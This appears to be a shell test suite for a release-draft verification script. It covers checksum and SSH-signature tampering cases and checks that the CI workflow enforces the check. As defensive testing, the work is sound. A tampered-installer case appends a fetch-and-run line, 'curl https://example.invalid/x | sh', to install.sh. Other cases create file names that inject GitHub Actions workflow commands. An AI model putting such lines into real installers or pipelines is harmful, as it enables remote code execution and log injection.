#!/bin/sh
# Tests of deploy/release/check-draft.sh, the check that release.yml's publish job runs on a draft right before it
# goes public (docs/m1/06-deploy-and-ci.md §9.3; README F15).
#
#   sh deploy/test/check-draft-test.sh
#
# `task test:sh` runs this file under dash and `bash --posix`, with CHECK_DRAFT_SHELL set to the same shell, which
# then runs check-draft.sh too (default: sh). Each case copies a draft made here, the way the sign job leaves it,
# changes one thing and runs the script on the copy: the draft as signed passes, and so do one without the cosign
# bundle and one with a hidden asset that the signed checksums.txt lists; an added asset, an added hidden one, a
# changed install.sh, a bad signature, a missing checksums line and the other cases below each fail, with the error
# of the check that is meant to catch them. The signing keys are made for the run with ssh-keygen (OpenSSH 8.1 or
# newer) and deleted with the drafts when the test ends: no key is committed.
#
# It also checks that release.yml's publish job still runs the script, between the last download of the draft and
# --draft=false, with exit 1 on a failure and no if: or continue-on-error: that would publish anyway; and that the
# inline checks of sign and sign-dry keep their strictness before they sign (sha256sum --strict, then dotglob and
# nullglob set before the loop that exits 1 on an unlisted asset, so hidden files count).
set -eu

# check-draft.sh writes its errors as annotations in GitHub Actions; the cases want the plain lines, and CI runs
# this file in Actions. One case turns them on again.
unset GITHUB_ACTIONS

HERE=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
CHECK_DRAFT=$HERE/../release/check-draft.sh
RELEASE_YML=$HERE/../../.github/workflows/release.yml
SH=${CHECK_DRAFT_SHELL:-sh}

for tool in ssh-keygen sha256sum awk; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    printf 'check-draft-test: %s is not installed\n' "$tool" >&2
    exit 1
  fi
done

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
trap 'exit 1' INT TERM
# The script runs from here, so that nothing depends on the working directory, which in publish is the checkout.
mkdir "$WORK/elsewhere"

PASSED=0
FAILED=0
RC=0
OUT=''

# ---------------------------------------------------------------------------------------------------------------
# The harness

# assert_eq NAME WANT GOT counts a check, and prints it when the two differ.
assert_eq() {
  if [ "$2" = "$3" ]; then
    PASSED=$((PASSED + 1))
    return 0
  fi
  FAILED=$((FAILED + 1))
  printf 'FAIL %s\n     want: %s\n     got:  %s\n' "$1" "$2" "$3"
}

# assert_contains NAME NEEDLE HAYSTACK counts a check that HAYSTACK has NEEDLE in it.
assert_contains() {
  case $3 in
  *"$2"*) PASSED=$((PASSED + 1)) ;;
  *)
    FAILED=$((FAILED + 1))
    printf 'FAIL %s\n     want it to contain: %s\n     got: %s\n' "$1" "$2" "$3"
    ;;
  esac
}

# assert_lacks NAME NEEDLE HAYSTACK counts a check that HAYSTACK does not have NEEDLE in it.
assert_lacks() {
  case $3 in
  *"$2"*)
    FAILED=$((FAILED + 1))
    printf 'FAIL %s\n     want it not to contain: %s\n     got: %s\n' "$1" "$2" "$3"
    ;;
  *) PASSED=$((PASSED + 1)) ;;
  esac
}

# check_in CWD ARGS... runs check-draft.sh with ARGS from the directory CWD, under the shell being tested. The exit
# code goes to RC, and stdout with stderr to OUT.
check_in() {
  ci_cwd=$1
  shift
  RC=0
  # shellcheck disable=SC2086 # CHECK_DRAFT_SHELL is a command with its options, such as "bash --posix"
  (cd "$ci_cwd" && $SH "$CHECK_DRAFT" "$@") >"$WORK/out" 2>&1 || RC=$?
  OUT=$(cat "$WORK/out")
}

# check DIR [SIGNERS] runs check-draft.sh on the draft DIR with the run's allowed_signers, or with SIGNERS.
check() {
  check_in "$WORK/elsewhere" "$1" "${2:-$SIGNERS}"
}

# expect_ok NAME DIR [SIGNERS]: the draft passes.
expect_ok() {
  check "$2" "${3:-$SIGNERS}"
  assert_eq "$1: exit code" 0 "$RC"
  assert_contains "$1: says ok" 'check-draft: ok:' "$OUT"
}

# expect_fail NAME DIR ERROR [SIGNERS]: the draft fails with exit code 1 and the error ERROR.
expect_fail() {
  check "$2" "${4:-$SIGNERS}"
  assert_eq "$1: exit code" 1 "$RC"
  assert_contains "$1: the error" "check-draft: $3" "$OUT"
  assert_lacks "$1: says no ok" 'check-draft: ok' "$OUT"
}

# sign DIR KEY [NAMESPACE] signs DIR/checksums.txt as the sign job does: an earlier signature goes first, since
# without a terminal ssh-keygen keeps it and still exits 0.
sign() {
  rm -f "$1/checksums.txt.sig"
  if ! ssh-keygen -Y sign -f "$2" -n "${3:-isshoni-checksums}" "$1/checksums.txt" >"$WORK/sign.out" 2>&1; then
    cat "$WORK/sign.out" >&2
    printf 'check-draft-test: ssh-keygen -Y sign failed (it needs OpenSSH 8.1 or newer)\n' >&2
    exit 1
  fi
}

# draft NAME prints the path of a new copy of the signed draft, named NAME.
draft() {
  cp -R "$SIGNED" "$WORK/drafts/$1"
  printf '%s\n' "$WORK/drafts/$1"
}

# sum_line DIR NAME prints checksums.txt's line for DIR/NAME.
sum_line() {
  (cd "$1" && sha256sum "$2")
}

# drop_line DIR NAME removes NAME's line from DIR/checksums.txt.
drop_line() {
  awk -v name="$2" '$2 != name' "$1/checksums.txt" >"$WORK/checksums.new"
  cat "$WORK/checksums.new" >"$1/checksums.txt"
}

# ---------------------------------------------------------------------------------------------------------------
# The keys and the draft

# The release key, another key, and the allowed_signers file that deploy/keys/allowed_signers would be (06 §9.4).
mkdir "$WORK/keys" "$WORK/drafts"
KEY=$WORK/keys/release-key
OTHER_KEY=$WORK/keys/other-key
ssh-keygen -q -t ed25519 -N '' -C check-draft-test -f "$KEY"
ssh-keygen -q -t ed25519 -N '' -C check-draft-test-other -f "$OTHER_KEY"
SIGNERS=$WORK/keys/allowed_signers
printf 'isshoni-release namespaces="isshoni-checksums" %s\n' "$(cat "$KEY.pub")" >"$SIGNERS"

# A draft as the sign job leaves it, with the asset names of 06 §3 (fewer of them): goreleaser's checksums.txt over
# every archive, package, SBOM, install.sh and compose file; its cosign bundle, which checksums.txt does not list;
# and checksums.txt.sig.
SIGNED=$WORK/signed
mkdir "$SIGNED"
for asset in isshoni_0.1.0_linux_amd64.tar.gz isshoni_0.1.0_linux_amd64.tar.gz.sbom.json \
  isshoni_0.1.0_linux_arm64.tar.gz isshoni_0.1.0_amd64.deb isshoni-0.1.0-1.x86_64.rpm install.sh compose.yaml; do
  printf 'the asset %s of the test release\n' "$asset" >"$SIGNED/$asset"
  sum_line "$SIGNED" "$asset" >>"$SIGNED/checksums.txt"
done
printf '{"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json"}\n' >"$SIGNED/checksums.txt.sigstore.json"
sign "$SIGNED" "$KEY"

# ---------------------------------------------------------------------------------------------------------------
# Drafts that pass

test_good() {
  d=$(draft good)
  expect_ok 'the draft as signed' "$d"
  assert_contains 'the draft as signed: counts every asset' 'each of the 7 assets' "$OUT"

  d=$(draft no-bundle)
  rm "$d/checksums.txt.sigstore.json"
  expect_ok 'without the cosign bundle' "$d"

  # A hidden asset that the signed checksums.txt lists passes: hidden files are checked, not refused by name.
  d=$(draft hidden-listed)
  printf 'listed\n' >"$d/.listed"
  sum_line "$d" .listed >>"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_ok 'a hidden asset that checksums.txt lists' "$d"
  assert_contains 'a hidden asset that checksums.txt lists: counted' 'each of the 8 assets' "$OUT"

  # The line form "<hex> *NAME" (sha256sum's binary mode) lists NAME too.
  d=$(draft binary-mode)
  sed 's/  install\.sh$/ *install.sh/' "$d/checksums.txt" >"$WORK/checksums.new"
  cat "$WORK/checksums.new" >"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_ok 'a "<hex> *NAME" line' "$d"

  # Relative names, as publish gives them (rel deploy/keys/allowed_signers, from the checkout).
  check_in "$WORK" drafts/good keys/allowed_signers
  assert_eq 'relative names: exit code' 0 "$RC"
  assert_contains 'relative names: says ok' 'check-draft: ok:' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# Assets that no signature covers (check 3)

test_unlisted() {
  d=$(draft added-asset)
  printf 'added\n' >"$d/isshoni_0.1.0_linux_riscv64.tar.gz"
  expect_fail 'an added asset' "$d" \
    'the draft has isshoni_0.1.0_linux_riscv64.tar.gz, which checksums.txt does not list'

  d=$(draft added-hidden)
  printf 'hidden\n' >"$d/.hidden"
  expect_fail 'an added hidden file' "$d" 'the draft has .hidden, which checksums.txt does not list'

  # Names are compared whole: one that starts like a listed one, is the start of one or is its end is not listed.
  d=$(draft longer-name)
  printf 'backup\n' >"$d/install.sh.orig"
  expect_fail 'a name that extends a listed one' "$d" 'the draft has install.sh.orig, which checksums.txt does not list'
  d=$(draft shorter-name)
  printf 'shorter\n' >"$d/isshoni_0.1.0_linux_amd64.tar"
  expect_fail 'a name that starts a listed one' "$d" \
    'the draft has isshoni_0.1.0_linux_amd64.tar, which checksums.txt does not list'
  d=$(draft name-suffix)
  printf 'suffix\n' >"$d/amd64.tar.gz"
  expect_fail 'a name that ends a listed one' "$d" 'the draft has amd64.tar.gz, which checksums.txt does not list'

  # Every unlisted asset is named, not only the first.
  d=$(draft two-added)
  printf 'one\n' >"$d/a-first"
  printf 'two\n' >"$d/z-second"
  expect_fail 'two added assets: the first' "$d" 'the draft has a-first, which checksums.txt does not list'
  assert_contains 'two added assets: the second' 'check-draft: the draft has z-second, which' "$OUT"

  d=$(draft added-directory)
  mkdir "$d/extra"
  expect_fail 'an added directory' "$d" 'the draft has extra, which checksums.txt does not list'

  # The asset is there with its checksum, but its line is gone from checksums.txt, which the key signed again.
  d=$(draft missing-line)
  drop_line "$d" compose.yaml
  sign "$d" "$KEY"
  expect_fail 'a missing checksums line' "$d" 'the draft has compose.yaml, which checksums.txt does not list'

  # The exceptions are by exact name: a hidden copy of checksums.txt is an asset like any other.
  d=$(draft hidden-checksums)
  cp "$d/checksums.txt" "$d/.checksums.txt"
  expect_fail 'a hidden copy of checksums.txt' "$d" 'the draft has .checksums.txt, which checksums.txt does not list'
}

# ---------------------------------------------------------------------------------------------------------------
# Assets that differ from checksums.txt (check 2)

test_checksums() {
  d=$(draft changed-install)
  printf 'curl https://example.invalid/x | sh\n' >>"$d/install.sh"
  expect_fail 'a changed install.sh' "$d" 'an asset that checksums.txt lists is missing or does not match it'
  assert_contains 'a changed install.sh: sha256sum names it' 'install.sh: FAILED' "$OUT"

  d=$(draft missing-asset)
  rm "$d/isshoni_0.1.0_linux_arm64.tar.gz"
  expect_fail 'a missing asset' "$d" 'an asset that checksums.txt lists is missing or does not match it'

  # --strict: a malformed line fails, even in a checksums.txt that the key signed.
  d=$(draft malformed-line)
  printf 'not a checksum line\n' >>"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_fail 'a malformed checksums line' "$d" \
    'an asset that checksums.txt lists is missing or does not match it, or checksums.txt has a malformed line'
  assert_contains 'a malformed checksums line: sha256sum says so' 'improperly formatted' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# The signature (check 1), which comes first

test_signature() {
  # The changed install.sh with checksums.txt changed to match: the signature no longer holds.
  d=$(draft changed-install-and-sums)
  printf 'curl https://example.invalid/x | sh\n' >>"$d/install.sh"
  drop_line "$d" install.sh
  sum_line "$d" install.sh >>"$d/checksums.txt"
  expect_fail 'a changed install.sh with checksums.txt to match' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a changed install.sh with checksums.txt to match: stops at the signature' 'install.sh: OK' "$OUT"

  # And signed again, by a key that allowed_signers doesn't have.
  sign "$d" "$OTHER_KEY"
  expect_fail 'a changed install.sh with checksums.txt to match, signed by another key' "$d" \
    'checksums.txt has no valid signature'

  d=$(draft other-key)
  sign "$d" "$OTHER_KEY"
  expect_fail 'a signature by another key' "$d" 'checksums.txt has no valid signature'

  d=$(draft other-namespace)
  sign "$d" "$KEY" file
  expect_fail 'a signature by the key for another namespace' "$d" 'checksums.txt has no valid signature'

  d=$(draft broken-signature)
  printf 'not a signature\n' >"$d/checksums.txt.sig"
  expect_fail 'a broken signature' "$d" 'checksums.txt has no valid signature'

  d=$(draft no-signature)
  rm "$d/checksums.txt.sig"
  expect_fail 'no signature' "$d" 'the draft has no checksums.txt.sig'

  d=$(draft no-checksums)
  rm "$d/checksums.txt"
  expect_fail 'no checksums.txt' "$d" 'the draft has no checksums.txt'

  # The line is gone, and nobody signed again: the signature catches it before the asset list does.
  d=$(draft missing-line-unsigned)
  drop_line "$d" compose.yaml
  expect_fail 'a missing checksums line, not signed again' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a missing checksums line, not signed again: stops at the signature' 'does not list' "$OUT"

  # An unlisted asset and a bad signature: only the signature is reported, since it comes first.
  d=$(draft both)
  printf 'added\n' >"$d/extra.tar.gz"
  sign "$d" "$OTHER_KEY"
  expect_fail 'a bad signature and an added asset' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a bad signature and an added asset: stops at the signature' 'extra.tar.gz' "$OUT"

  # allowed_signers: empty, missing, the key for another principal or for another namespace.
  d=$(draft good-again)
  : >"$WORK/keys/empty_signers"
  expect_fail 'an empty allowed_signers' "$d" \
    "$WORK/keys/empty_signers is missing or empty, so no key can check the signature" "$WORK/keys/empty_signers"
  expect_fail 'no allowed_signers' "$d" \
    "$WORK/keys/no_such_file is missing or empty, so no key can check the signature" "$WORK/keys/no_such_file"
  printf 'someone-else namespaces="isshoni-checksums" %s\n' "$(cat "$KEY.pub")" >"$WORK/keys/other_principal"
  expect_fail 'the key for another principal' "$d" 'checksums.txt has no valid signature' \
    "$WORK/keys/other_principal"
  printf 'isshoni-release namespaces="file" %s\n' "$(cat "$KEY.pub")" >"$WORK/keys/other_namespace"
  expect_fail 'the key for another namespace' "$d" 'checksums.txt has no valid signature' \
    "$WORK/keys/other_namespace"
}

# ---------------------------------------------------------------------------------------------------------------
# Usage, and the annotations in GitHub Actions

test_usage() {
  check_in "$WORK/elsewhere"
  assert_eq 'no arguments: exit code' 2 "$RC"
  assert_contains 'no arguments: usage' 'Usage: sh ' "$OUT"
  check_in "$WORK/elsewhere" "$SIGNED" "$SIGNERS" extra
  assert_eq 'three arguments: exit code' 2 "$RC"
  check_in "$WORK/elsewhere" -h
  assert_eq '-h: exit code' 0 "$RC"
  assert_contains '-h: usage' 'DIR ALLOWED_SIGNERS' "$OUT"
  expect_fail 'DIR is no directory' "$WORK/no-such-draft" "$WORK/no-such-draft is not a directory"
}

test_annotations() {
  d=$(draft annotated)
  printf 'added\n' >"$d/extra.tar.gz"
  # A name with a line break, which must not start a workflow command of its own.
  nl='
'
  printf 'added\n' >"$d/evil$nl::warning::injected"
  # And one with "%0A" in it, which the runner would decode into a line break of the annotation.
  printf 'added\n' >"$d/x%0Ay"
  GITHUB_ACTIONS=true
  export GITHUB_ACTIONS
  check "$d"
  unset GITHUB_ACTIONS
  assert_eq 'in GitHub Actions: exit code' 1 "$RC"
  assert_contains 'in GitHub Actions: an error annotation' \
    '::error::check-draft: the draft has extra.tar.gz, which checksums.txt does not list' "$OUT"
  assert_contains 'in GitHub Actions: the line break is shown as ?' \
    '::error::check-draft: the draft has evil?::warning::injected, which' "$OUT"
  assert_eq 'in GitHub Actions: no line starts a command of its own' 0 \
    "$(printf '%s\n' "$OUT" | grep -c '^::warning::' || true)"
  assert_contains 'in GitHub Actions: % is escaped as %25' '::error::check-draft: the draft has x%250Ay, which' "$OUT"

  # Outside GitHub Actions the name stays as it is.
  check "$d"
  assert_contains 'outside GitHub Actions: % stays %' 'check-draft: the draft has x%0Ay, which' "$OUT"
  assert_lacks 'outside GitHub Actions: no annotation' '::error::' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# release.yml runs the script, and sign's own checks stay strict

# job NAME prints the lines of release.yml's job NAME.
job() {
  awk -v job="  $1:" '
    $0 == job { on = 1; print; next }
    on && /^  [A-Za-z0-9_-]+:/ { exit }
    on { print }' "$RELEASE_YML"
}

# line_no first|last ERE [AFTER] prints the number of the first or the last line of stdin after the line AFTER
# (default 0) that matches the extended regular expression ERE, or 0 when there is none. Comment lines don't count.
# ERE comes from the environment, so that awk -v doesn't turn its backslashes into escapes.
line_no() {
  LINE_NO_RE=$2 awk -v which="$1" -v after="${3:-0}" '
    NR <= after || /^ *#/ { next }
    $0 ~ ENVIRON["LINE_NO_RE"] { n = NR; if (which == "first") exit }
    END { print n + 0 }'
}

# keys_between A B prints how many lines of stdin between the lines A and B are a step's `if:` or
# `continue-on-error:` (also as the step's first key, after its "- "), either of which could let a later step run
# after a failed check.
keys_between() {
  awk -v a="$1" -v b="$2" 'NR > a && NR < b && /^ *(- )?(if|continue-on-error):/ { n++ } END { print n + 0 }'
}

# ascending N... prints "ascending" when every N is above the one before it and the first is above 0, and
# otherwise "not ascending:" with the list.
ascending() {
  asc_prev=0
  for asc_n; do
    if [ "$asc_n" -le "$asc_prev" ]; then
      printf 'not ascending: %s\n' "$*"
      return 0
    fi
    asc_prev=$asc_n
  done
  printf 'ascending\n'
}

test_release_yml() {
  publish=$(job publish)
  # publish runs the script on rel/ with deploy/keys/allowed_signers, and a failure ends the step with exit 1: an
  # `|| true` on the line, or an if that goes on, would let the draft go public.
  assert_eq 'release.yml: publish fails when check-draft.sh fails' 1 \
    "$(printf '%s\n' "$publish" |
      grep -c '^ *if ! sh deploy/release/check-draft\.sh rel deploy/keys/allowed_signers; then$' || true)"
  guard=$(printf '%s\n' "$publish" | awk '
    /^ *if ! sh deploy\/release\/check-draft\.sh / { on = 1; next }
    on && /^ *fi$/ { exit }
    on && /exit/ { sub(/^ */, ""); print }')
  assert_eq 'release.yml: publish exits 1 when check-draft.sh fails, and exits nowhere else in that if' \
    'exit 1' "$guard"
  # In this order: the last download of the draft, the check, and the first --draft=false; and between the
  # download and --draft=false no step has an if: or continue-on-error: that could publish after a failed check.
  dl=$(printf '%s\n' "$publish" | line_no last 'gh release download "[$]TAG"')
  ck=$(printf '%s\n' "$publish" | line_no first 'sh deploy/release/check-draft\.sh')
  pub=$(printf '%s\n' "$publish" | line_no first '--draft=false')
  assert_eq 'release.yml: publish downloads the draft, then checks it, then publishes it' ascending \
    "$(ascending "$dl" "$ck" "$pub")"
  assert_eq 'release.yml: publish has no if: or continue-on-error: from the download to --draft=false' 0 \
    "$(printf '%s\n' "$publish" | keys_between "$dl" "$pub")"
  assert_eq 'release.yml: publish checks out deploy/release' 1 \
    "$(printf '%s\n' "$publish" | grep -c '^ *deploy/release$' || true)"
  assert_eq 'release.yml: publish has no inline copy of the check left' 0 \
    "$(printf '%s\n' "$publish" | grep -v '^ *#' | grep -c 'sha256sum\|ssh-keygen' || true)"

  # sign and sign-dry check the draft inline, before they sign it: with --strict, then with dotglob and nullglob
  # set, a loop over rel/ that exits 1 on an asset that checksums.txt does not list, hidden ones included; and no
  # if: or continue-on-error: from that step to the signature.
  for j in sign sign-dry; do
    body=$(job "$j")
    assert_eq "release.yml: $j runs sha256sum --strict -c" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *(cd rel && sha256sum --strict -c checksums\.txt)$' || true)"
    assert_eq "release.yml: $j counts hidden files (dotglob nullglob)" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *shopt -s dotglob nullglob$' || true)"
    assert_eq "release.yml: $j walks the draft for unlisted assets" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *for f in rel/\*; do$' || true)"
    assert_eq "release.yml: $j fails on an unlisted asset" 1 \
      "$(printf '%s\n' "$body" | grep -c 'which checksums\.txt does not list"$' || true)"
    step=$(printf '%s\n' "$body" | line_no first '^ *- name: Every asset matches checksums\.txt$')
    strict=$(printf '%s\n' "$body" | line_no first 'sha256sum --strict -c')
    glob=$(printf '%s\n' "$body" | line_no first '^ *shopt -s dotglob nullglob$')
    loop=$(printf '%s\n' "$body" | line_no first '^ *for f in rel/\*; do$')
    msg=$(printf '%s\n' "$body" | line_no first 'which checksums\.txt does not list"$')
    ex=$(printf '%s\n' "$body" | line_no first '^ *exit 1$' "$msg")
    endif=$(printf '%s\n' "$body" | line_no first '^ *fi$' "$msg")
    endloop=$(printf '%s\n' "$body" | line_no first '^ *done$' "$msg")
    sig=$(printf '%s\n' "$body" | line_no first 'ssh-keygen -Y sign ')
    assert_eq "release.yml: $j checks with --strict, sets dotglob nullglob, walks rel/, exits 1, then signs" \
      ascending "$(ascending "$step" "$strict" "$glob" "$loop" "$msg" "$ex" "$endif" "$endloop" "$sig")"
    assert_eq "release.yml: $j has no if: or continue-on-error: from its check to the signature" 0 \
      "$(printf '%s\n' "$body" | keys_between "$step" "$sig")"
  done
}

# ---------------------------------------------------------------------------------------------------------------

printf 'check-draft-test: deploy/release/check-draft.sh under %s\n' "$SH"
test_good
test_unlisted
test_checksums
test_signature
test_usage
test_annotations
test_release_yml

printf '%s passed, %s failed\n' "$PASSED" "$FAILED"
[ "$FAILED" -eq 0 ]
